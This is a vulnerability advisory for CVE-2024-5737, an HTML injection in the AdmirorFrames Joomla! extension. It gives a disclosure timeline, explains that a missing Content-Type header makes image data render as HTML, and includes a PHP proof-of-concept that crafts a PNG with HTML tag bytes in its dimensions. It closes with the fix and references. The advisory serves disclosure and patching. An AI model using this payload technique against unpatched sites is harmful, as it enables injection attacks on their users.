# CVE-2024-5737
AdmirorFrames Joomla! Extension < 5.0 - HTML Injection

## Timeline
- Vulnerability reported to vendor: 26.01.2024
- New fixed 5.0 version released: 06.06.2024
- Public disclosure: 28.06.2024

## Description

HTML Injection in AdmirorFrames Joomla! Extension in `afGdStream.php` file which doesn't set up `Content-Type` header value before sending image data. This causes PHP to send default value of this header (`text/html`) and causes image data to be interptreted as HTML document.  

Example PHP script that generates PNG with width and height fields set to `<s>` HTML tag:
```
<?php
$_payload="AAA";
if(strlen($_payload)%3!=0){
 echo "payload%3==0 !\n"; exit();
}
$_pay_len=strlen($_payload);
echo "LEN: $_pay_len\n";
$width=0x733e; //<s>
$height=0x3c;
$im = imagecreate($width, $height);

$_hex=unpack('H*',$_payload);
$_chunks=str_split($_hex[1], 6);

for($i=0; $i < count($_chunks); $i++){

  $_color_chunks=str_split($_chunks[$i], 2);
  $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));

  imagesetpixel($im,$i,1,$color);

}

imagepng($im,"example.png");
```

Result of rendering `example.png` proof of concept file by web browser:
![proof of concept](poc.png)

This issue was caused by usage of default value of `Content-Type` header. This problem has been fixed in AdmirorFrames Joomla! Extension at version 5.0.

## Affected versions
< 5.0 

## Advisory
Update AdmirorFrames Joomla! Extension to version 5.0 or newer.

### References
* https://github.com/vasiljevski/admirorframes/issues/3
* https://cert.pl/en/posts/2024/06/CVE-2024-5735/
* https://cert.pl/posts/2024/06/CVE-2024-5735/
* https://nvd.nist.gov/vuln/detail/CVE-2024-5737
